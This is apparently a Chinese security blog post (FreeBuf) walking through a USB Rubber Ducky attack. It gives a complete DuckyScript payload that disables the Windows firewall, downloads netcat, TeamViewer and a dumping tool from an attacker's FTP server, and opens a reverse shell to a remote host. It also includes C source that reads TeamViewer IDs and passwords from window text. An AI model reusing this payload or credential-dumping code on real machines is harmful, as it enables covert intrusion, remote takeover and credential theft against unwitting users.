@@ -1,0 +1,49 @@
+*本文作者：Seagull，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。
+前言：
+鸭子到手以后的包装还是比较寒掺的，就一个纸袋；里面有优盘的壳子、minSD读卡器、橡皮鸭、minSD卡、一个usb口转换器（这些东西感觉20块就能做出来，简直是暴利啊！！）
+下面上图：
+0.1: 开搞之前先来说说什么是橡皮鸭和需要的一些准备工作。
+0.1:什么是橡皮鸭（有借鉴）
+USB RUBBER DUCKY（USB 橡皮鸭）是最早的按键注入工具。自2010年以来，USB橡皮鸭就一直深受黑客、渗透测试人员以及IT专家的欢迎。USB 橡皮鸭最初作为一个IT自动化的POC，通过嵌入式开发板实现的，后来它发展成为一个成熟的商业化按键注入攻击平台。USB橡皮鸭通过简单的脚本语言、强大的硬件以及出色的伪装成功地俘获了黑客的“芳心”。（谁能想到这么可爱的大黄鸭却暗藏杀机）。
+不管是笔记本、台式机、平板以及智能手机，几乎每个计算机都通过键盘获得输入。这就是为什么会有一个无处不在的USB标准HID（人机接口设备）。任何一个宣称是键盘HID的设备都能够被大多数操作系统自动的探测和接入。不管它是Windows、Mac或Android系统，键盘就是老大。
+简单的说，橡皮鸭就是将自己模拟成usb的键盘，可以执行键盘能执行的操作，以此来逃过安全软件的一些检查，但是在后面的实验中我发现如果对装了安全软件的电脑进行一下危险操作的时候还是会有告警弹出来，但绝大部分操作是不会告警的。
+0.2: 需要用的一些网站
+橡皮鸭是有官网的，上面提供encode（编译），decode（反编译）和一些payload。上面还有一个自动生成payload的工具，感觉不太好用，就不说了。
+地址是：https://ducktoolkit.com/
+编译界面：
+反编译界面：
+Github上面也有很多的payload可以用，也可以下载本地编译的java包。
+语法介绍和本地编译文件下载：
+https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript
+各种payload下载：
+https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
+1.0 现在我们可以开始搞起了。
+1.1 首先我们先脑补一下拓扑：
+以上是这个实验的逻辑拓扑：
+1、VPS是我在网上租的，用来科学上网的，顺便做做其他事情。（VPS是有公网地址的） 2、我的电脑用于连接VPS的进行一些操作和控制被攻击的电脑的。（只有私网地址） 3、被攻击的电脑只要等着被攻击就好。（只有私网地址）
+PS：由于楼主比较穷只有一台电脑，所以这里没有被攻击的电脑，所有攻击操作都在我的电脑上进行。
+1.2 思路和主要步骤
+（1）在VPS上搭建ftp服务器，上传一些软件（包含NC、TeamViewer、tv_dump）；开启NC的监听。 （2）利用橡皮鸭对电脑的CMD进行操作，使电脑下载VPS上的文件（包含NC、TeamViewer、tv_dump）并反弹shell给VPS。 （3）在VPS上打开被控端的TeamViewer和tv_dump，获取TeamViewer的用户名密码，如果不需要图形化操作的话可以不打开，就用CMD就好。 （4）用TeamViewer连接被控端。
+2.0橡皮鸭的操作
+2.1 思路和payload
+思路：
+（1）用管理员权限打开cmd，进入用户目录，关闭防火墙。 注1：如果用户防火墙开着在下载文件的时候会弹出提示，这样操作就会失败。 注2：如果用户装了安全软件如360这种，关闭防火墙的时候会有告警弹出，也会失败。 （2）只用cmd写一个txt文件，内容包括ftp的地址、用户、下载的文件名。 （3）执行这个txt文件，并在执行完以后删除这个文件。 注：考虑到电脑的执行速度不同，以上步骤要设置一些延时。 （4）关闭刚才的cmd并打开一个新的cmd。 （5）用cmd执行NC绑定cmd反弹的命令（后台执行）。 （6）关闭cmd
+Payload如下：
+DELAY10000 GUI x DELAY200 a DELAY600 STRINGcd %USERPROFILE% ENTER DELAY100 STRINGnetsh firewall set opmode mode=disable profile =ALL ENTER DELAY2000 STRINGecho open x.x.x.x 21 > ftp.txt ENTER DELAY100 STRINGecho anonymous>> ftp.txt ENTER DELAY100 STRINGecho bin >> ftp.txt ENTER DELAY100 STRINGecho get TeamViewer.exe >> ftp.txt ENTER DELAY100 STRINGecho get nc.exe >> ftp.txt ENTER DELAY100 STRINGecho get tv_dump.exe >> ftp.txt ENTER DELAY100 STRINGecho bye >> ftp.txt ENTER DELAY100 STRINGftp -s:ftp.txt ENTER DELAY2000 STRINGdel ftp.txt & exit ENTER DELAY2000 GUI x DELAY200 a DELAY200 STRINGcd %USERPROFILE% ENTER DELAY200 STRINGnc.exe -e cmd.exe -d x.x.x.x 9999 ENTER DELAY2000 ALT F4
+这个payload应该很好理解，我就不解释了。可以通过刚才github的网站上面看到语法的具体讲解。主要要注意的是延时，因为鸭子插到电脑上以后就立刻开始执行padload了，要留点时间给电脑加载驱动之类的。
+3.0 VPS
+3.1 第一阶段
+这里我用的是centOS，百度一下搭了一个ftp服务器，装了一个NC，上传了一些文件。
+3.2 开始监听NC的端口
+注：这里要注意设置好centOS的防火墙，把9999端口放行，不然NC是看不到东西的。
+4.0 tv_dump.exe
+这是一个获取teamviewer用户名密码的软件，百度上源码很多，我下了一个自己编译了一下。
+#defineWIN32_LEAN_AND_MEAN #include<windows.h> #include<iostream> #include<string.h> #pragmacomment( lib, "kernel32" ) #pragmacomment( lib, "user32" ) BOOLCALLBACK EnumMainTVWindow(HWND hwnd, LPARAM lParam) { const int BufferSize = 1024; char BufferContent[BufferSize] =""; SendMessage(hwnd, WM_GETTEXT,(WPARAM)BufferSize, (LPARAM)BufferContent); printf("%s
+", BufferContent); return 1; } intmain() { HWND hwndTeamViewer = FindWindow(NULL,"TeamViewer"); EnumChildWindows(hwndTeamViewer, EnumMainTVWindow,0); return 0; }
+5.0 实战
+所有工作都做好了，我们来操作一波。
+5.1 插入橡皮鸭
+PS：左边的CRT是远程的VPS，监控9999端口；右边是我电脑的防火墙和用户目录。
+5.2 远程打开teamViewer
+5.3 获取teamViewer的ID和密码
+*本文作者：Seagull，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。
